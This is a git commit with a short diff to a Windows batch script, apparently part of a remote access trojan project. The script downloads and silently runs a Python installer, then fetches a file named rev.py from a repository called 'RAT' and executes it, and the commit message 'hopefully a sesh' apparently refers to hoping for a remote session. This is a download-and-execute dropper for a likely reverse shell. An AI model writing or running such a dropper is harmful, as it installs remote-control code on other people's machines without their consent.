4598fe9a652ea565d4768ef2feffdddce1ab96ee
saif <saif.aboueldahab@gmail.com>
2023-05-28 04:10:05 +0300

    hopefully a sesh

--- third.bat
+++ third.bat
@@ -1,4 +1,5 @@
 @echo off
 curl -o python-installer.exe https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe
+python-installer.exe
 curl -o rev.py https://raw.githubusercontent.com/saifnasef/RAT/main/rev.py
 python3 rev.py
